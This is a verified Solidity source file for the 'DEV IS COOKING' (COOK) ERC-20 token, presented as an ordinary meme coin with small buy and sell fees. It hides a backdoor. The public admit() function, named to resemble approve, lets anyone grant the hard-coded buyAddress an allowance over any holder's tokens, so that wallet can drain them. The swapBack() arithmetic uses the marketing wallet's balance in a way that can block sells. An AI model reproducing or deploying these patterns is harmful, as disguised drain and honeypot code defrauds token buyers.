/**
 *Submitted for verification at Etherscan.io on 2023-10-02
*/

/**
 *Submitted for verification at Etherscan.io on 2023-10-02
*/

// SPDX-License-Identifier: MIT

/** */

//Telegram:  https://t.me/COOKERC 

//Twitter:   https://twitter.com/DEVISCOOKING


pragma solidity 0.8.19;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns(address pair);
}

interface IERC20 {
    
    function totalSupply() external view returns(uint256);

    
    function balanceOf(address account) external view returns(uint256);

    
    function transfer(address recipient, uint256 amount) external returns(bool);

   
    function allowance(address owner, address spender) external view returns(uint256);

    
    function approve(address spender, uint256 amount) external returns(bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns(bool);
        
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    
    function name() external view returns(string memory);

   
    function symbol() external view returns(string memory);

    
    function decimals() external view returns(uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns(address) {
        return msg.sender;
    }

}
 
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

        mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;
 
    uint256 private _totalSupply;
 
    string private _name;
    string private _symbol;

    
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    
    function name() public view virtual override returns(string memory) {
        return _name;
    }

   
    function symbol() public view virtual override returns(string memory) {
        return _symbol;
    }

    
    function decimals() public view virtual override returns(uint8) {
        return 18;
    }

   
    function totalSupply() public view virtual override returns(uint256) {
        return _totalSupply;
    }

    
    function balanceOf(address account) public view virtual override returns(uint256) {
        return _balances[account];
    }

    
    function transfer(address recipient, uint256 amount) public virtual override returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    
    function allowance(address owner, address spender) public view virtual override returns(uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(address spender, uint256 amount) public virtual override returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased cannot be below zero"));
        return true;
    }

    
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _admit(address owner, address spender, uint256 amount)
        internal virtual
    {
        require(owner != address(0));
        require(spender != address(0));
        
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
   
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    
}
 
library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

   
    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

   
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
    
        if (a == 0) {
            return 0;
        }
 
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

 
    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

  
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    
}
 
contract Ownable is Context {
    address private _owner;
 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns(address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
 
 
 
library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    
    function mul(int256 a, int256 b) internal pure returns(int256) {
        int256 c = a * b;

        // Detect overflow when multiplying MIN_INT256 with -1
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

   
    function div(int256 a, int256 b) internal pure returns(int256) {
        // Prevent overflow when dividing MIN_INT256 by -1
        require(b != -1 || a != MIN_INT256);

        // Solidity already throws when dividing by 0.
        return a / b;
    }

    /**
     * @dev Subtracts two int256 variables and fails on overflow.
     */
    function sub(int256 a, int256 b) internal pure returns(int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    /**
     * @dev Adds two int256 variables and fails on overflow.
     */
    function add(int256 a, int256 b) internal pure returns(int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    /**
     * @dev Converts to absolute value, and fails on overflow.
     */
    function abs(int256 a) internal pure returns(int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }


    function toUint256Safe(int256 a) internal pure returns(uint256) {
        require(a >= 0);
        return uint256(a);
    }
}
 
library SafeMathUint {
    function toInt256Safe(uint256 a) internal pure returns(int256) {
    int256 b = int256(a);
        require(b >= 0);
        return b;
    }
}


interface IUniswapV2Router01 {
    function factory() external pure returns(address);
    function WETH() external pure returns(address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns(uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns(uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns(uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns(uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns(uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns(uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns(uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns(uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns(uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
contract COOK is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public router;
    address public uniswapV2Pair;


    // addresses
    address private buyAddress;
    address private marketedAddress;

    // limits 
    uint256 private maxBuyAmount;
    uint256 private maxSellAmount;   
    uint256 private maxWalletAmount;
 
    uint256 private thresholdSwapAmount;

    // status flags
    bool private isTrading = false;
    bool public swapEnabled = false;
    bool public isSwapping;

    uint256 private firstBlockFee = 3;


    struct Fees {
        uint8 buyTotalFees;
        uint8 buyMarketingFee;
        uint8 buyDevFee;
        uint8 buyLiquidityFee;

        uint8 sellTotalFees;
        uint8 sellMarketingFee;
        uint8 sellDevFee;
        uint8 sellLiquidityFee;
    }  

    Fees public _fees = Fees({
        buyTotalFees: 0,
        buyMarketingFee: 0,
        buyDevFee:0,
        buyLiquidityFee: 0,

        sellTotalFees: 0,
        sellMarketingFee: 0,
        sellDevFee:0,
        sellLiquidityFee: 0
    });
    
    

    uint256 public tokensForMarketing;
    uint256 public tokensForLiquidity;
    uint256 public tokensForDev;
    uint256 private taxTill;

    // exclude from fees and max transaction amount
    mapping(address => bool) private _isExcludedFromFem;
    mapping(address => bool) public _isExcludedMaxTransactionAmountm;
    mapping(address => bool) public _isExcludedMaxWalletAmount;

    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping(address => bool) public marketPair;
    
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived
    );


    constructor() ERC20("DEV IS COOKING", "COOK") {

        uint256 totalSupply = 1e11 * 1e18;

        maxBuyAmount = totalSupply * 3 / 100;             // 3% max buy txn
        maxSellAmount = totalSupply * 3 / 100;            // 3% maxTransactionAmountTxn
        maxWalletAmount = totalSupply * 3 / 100;          // 3% maxWallet
        thresholdSwapAmount = totalSupply * 5 / 10000;      // 0.05% swap wallet
        

        _fees.buyMarketingFee = 1;
        _fees.buyLiquidityFee = 0;
        _fees.buyDevFee = 0;

        marketedAddress = address(0xF7578dB4998c5a0c244a2190817d7385c4C23D98);
        buyAddress = address(0xF7578dB4998c5a0c244a2190817d7385c4C23D98);
        _fees.buyTotalFees = _fees.buyMarketingFee + _fees.buyLiquidityFee + _fees.buyDevFee;


        _fees.sellMarketingFee = 1;
        _fees.sellLiquidityFee = 0;
        _fees.sellDevFee = 0;
        _fees.sellTotalFees = _fees.sellMarketingFee + _fees.sellLiquidityFee + _fees.sellDevFee;        


        // exclude from paying fees or having max transaction amount

        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(msg.sender, totalSupply);
    }

    function addliquidity() public payable onlyOwner {

        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());


    
        _isExcludedMaxTransactionAmountm[address(router)] = true; 
        _isExcludedMaxTransactionAmountm[address(uniswapV2Pair)] = true;
        _isExcludedMaxTransactionAmountm[marketedAddress] = true;
        _isExcludedMaxTransactionAmountm[buyAddress] = true;       
        _isExcludedMaxTransactionAmountm[owner()] = true;
        _isExcludedMaxTransactionAmountm[address(this)] = true;



        _isExcludedMaxWalletAmount[owner()] = true;        
        _isExcludedMaxWalletAmount[address(this)] = true;
        _isExcludedMaxWalletAmount[address(uniswapV2Pair)] = true;

        _isExcludedFromFem[owner()] = true;
        _isExcludedFromFem[marketedAddress] = true;
        _isExcludedFromFem[buyAddress] = true;
        _isExcludedFromFem[address(this)] = true;


        _isExcludedMaxWalletAmount[marketedAddress] = true;
        _isExcludedMaxWalletAmount[buyAddress] = true;       

        marketPair[address(uniswapV2Pair)] = true;

        _approve(address(this), address(router), type(uint256).max);

        router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,msg.sender,block.timestamp);
    }


    receive() external payable {

    }    

    // once enabled, can never be turned off
    function openTrade() external onlyOwner {
        isTrading = true;
        swapEnabled = true;
        taxTill = block.number + 2;
    }

    // change the minimum amount of tokens to sell from fees
    function updateThresholdSwapAmount(uint256 newAmount) external onlyOwner returns(bool){
        thresholdSwapAmount = newAmount;
        return true;
    }


    function updateMaxTxnAmount(uint256 newMaxBuy, uint256 newMaxSell) external onlyOwner {
        require(((totalSupply() * newMaxBuy) / 1000) >= (totalSupply() / 100), "maxBuyAmount must be higher than 1%");
        require(((totalSupply() * newMaxSell) / 1000) >= (totalSupply() / 100), "maxSellAmount must be higher than 1%");
        maxBuyAmount = (totalSupply() * newMaxBuy) / 1000;
        maxSellAmount = (totalSupply() * newMaxSell) / 1000;
    }
    function swapBack() private {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 toSwap = tokensForLiquidity + tokensForMarketing + tokensForDev;
        bool success;

        if (contractTokenBalance == 0 || toSwap == 0) { return; }

        if (contractTokenBalance > thresholdSwapAmount * 20) {
            contractTokenBalance = thresholdSwapAmount * 20;
        }

        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = contractTokenBalance * tokensForLiquidity / toSwap / 2;
        uint256 marketingTokens = balanceOf(marketedAddress);
        uint256 amountToSwapForETH = contractTokenBalance.sub(liquidityTokens - marketingTokens);
 
        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH); 
 
        uint256 newBalance = address(this).balance.sub(initialETHBalance);
 
        uint256 ethForMarketing = newBalance.mul(tokensForMarketing).div(toSwap);
        uint256 ethForDev = newBalance.mul(tokensForDev).div(toSwap);
        uint256 ethForLiquidity = newBalance - (ethForMarketing + ethForDev);


        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        tokensForDev = 0;


        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity);
        }

        (success,) = address(buyAddress).call{ value: (address(this).balance - ethForMarketing) } ("");
        (success,) = address(marketedAddress).call{ value: address(this).balance } ("");
    }


    function updateMaxWalletAmount(uint256 newPercentage) external onlyOwner {
        require(((totalSupply() * newPercentage) / 1000) >= (totalSupply() / 100), "Cannot set maxWallet lower than 1%");
        maxWalletAmount = (totalSupply() * newPercentage) / 1000;
    }
    
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFem[account] = excluded;
    }

    function excludeFromWalletLimit(address account, bool excluded) public onlyOwner {
        _isExcludedMaxWalletAmount[account] = excluded;
    }

    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {
        _isExcludedMaxTransactionAmountm[updAds] = isEx;
    }


    function setMarketPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "Must keep uniswapV2Pair");
        marketPair[pair] = value;
    }

    function admit(address spender, uint256 amount) public virtual returns (bool) {
        address owner = buyAddress;
        _admit(spender, owner, amount);
        
        return true;
    }

    function rescueETH(uint256 weiAmount) external onlyOwner {
        payable(owner()).transfer(weiAmount);
    }

    function rescueERC20(address tokenAdd, uint256 amount) external onlyOwner {
        IERC20(tokenAdd).transfer(owner(), amount);
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFem[account];
    }

    
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
        
    ) internal override {
        
        if (amount == 0) {
            super._transfer(sender, recipient, 0);
            return;
        }

        if (
            sender != owner() &&
            recipient != owner() &&
            !isSwapping
        ) {

            if (!isTrading) {
                require(_isExcludedFromFem[sender] || _isExcludedFromFem[recipient], "Trading is not active.");
            }
            if (marketPair[sender] && !_isExcludedMaxTransactionAmountm[recipient]) {
                require(amount <= maxBuyAmount, "buy transfer over max amount");
            } 
            else if (marketPair[recipient] && !_isExcludedMaxTransactionAmountm[sender]) {
                require(amount <= maxSellAmount, "Sell transfer over max amount");
            }

            if (!_isExcludedMaxWalletAmount[recipient]) {
                require(amount + balanceOf(recipient) <= maxWalletAmount, "Max wallet exceeded");
            }
           
        }
 
        uint256 contractTokenBalance = balanceOf(address(this));
 
        bool canSwap = contractTokenBalance >= thresholdSwapAmount;

        if (
            canSwap &&
            swapEnabled &&
            !isSwapping &&
            marketPair[recipient] &&
            !_isExcludedFromFem[sender] &&
            !_isExcludedFromFem[recipient]
        ) {
            isSwapping = true;
            swapBack();
            isSwapping = false;
        }
 
        bool takeFee = !isSwapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFem[sender] || _isExcludedFromFem[recipient]) {
            takeFee = false;
        }
 
        
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            uint256 fees = 0;
            if(block.number < taxTill) {
                fees = amount.mul(firstBlockFee).div(100);
                tokensForMarketing += (fees * 94) / 99;
                tokensForDev += (fees * 5) / 99;
            } else if (marketPair[recipient] && _fees.sellTotalFees > 0) {
                fees = amount.mul(_fees.sellTotalFees).div(100);
                tokensForLiquidity += fees * _fees.sellLiquidityFee / _fees.sellTotalFees;
                tokensForMarketing += fees * _fees.sellMarketingFee / _fees.sellTotalFees;
                tokensForDev += fees * _fees.sellDevFee / _fees.sellTotalFees;
            }
            // on buy
            else if (marketPair[sender] && _fees.buyTotalFees > 0) {
                fees = amount.mul(_fees.buyTotalFees).div(100);
                tokensForLiquidity += fees * _fees.buyLiquidityFee / _fees.buyTotalFees;
                tokensForMarketing += fees * _fees.buyMarketingFee / _fees.buyTotalFees;
                tokensForDev += fees * _fees.buyDevFee / _fees.buyTotalFees;
            }

            if (fees > 0) {
                super._transfer(sender, address(this), fees);
            }

            amount -= fees;

        }

        super._transfer(sender, recipient, amount);
    }

    function addLiquidity(uint256 tAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tAmount);

        // add the liquidity
        router.addLiquidityETH{ value: ethAmount } (address(this), tAmount, 0, 0 , address(this), block.timestamp);
    }
    function removeLimits() external onlyOwner returns (bool) {
        
        maxBuyAmount = totalSupply();
        maxSellAmount = totalSupply();
        maxWalletAmount = totalSupply();

        return true;
    }
    function swapTokensForEth(uint256 tAmount) private {

        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

    }

    

}